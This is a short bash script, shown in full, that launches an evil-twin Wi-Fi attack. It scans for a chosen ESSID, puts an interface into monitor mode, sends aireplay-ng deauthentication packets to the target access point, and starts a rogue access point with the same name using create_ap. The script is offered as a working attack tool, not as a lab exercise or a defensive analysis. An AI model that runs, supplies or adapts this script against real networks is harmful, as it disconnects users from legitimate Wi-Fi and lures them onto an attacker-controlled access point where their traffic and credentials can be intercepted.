#!/bin/bash
echo "Enter interface for monitoring/injection"
read interface_deauth
echo "Enter interface for rogue AP"
read interface_ap
echo "Enter faceing interface"
read interface_faceing

iwlist wlp4s0 scan | grep "ESSID"

echo "Enter the ESSID of the target AP"
read essid

array=( $(sudo iwlist wlp4s0 scan | grep "Address\|Channel:\|ESSID:" | grep -B 2 "${essid}") )
count=0
echo "Do you really want to attack ${essid} Yes/No ?"
read response
if [ $response = Yes ]
then
	echo "Attack launched"
	ifconfig ${interface_deauth} down
        iwconfig ${interface_deauth} mode monitor
	ifconfig ${interface_deauth} up
	for i in "${array[@]}"
	do
		if [ $(($count%8)) -eq 4 ]
		then
			address=$i
		fi
		if [ $(($count%8)) -eq 5 ]
		then
			channel="${i//[!0-9]/}"
			#echo "Channel ${channel} and MAC ${address}"
			iwconfig ${interface_deauth} channel ${channel}
			(sleep 7s; aireplay-ng -0 15 -a ${address} ${interface_deauth}) &
			create_ap ${interface_ap} ${interface_faceing} ${essid}
		fi
		((++count))
	done
fi



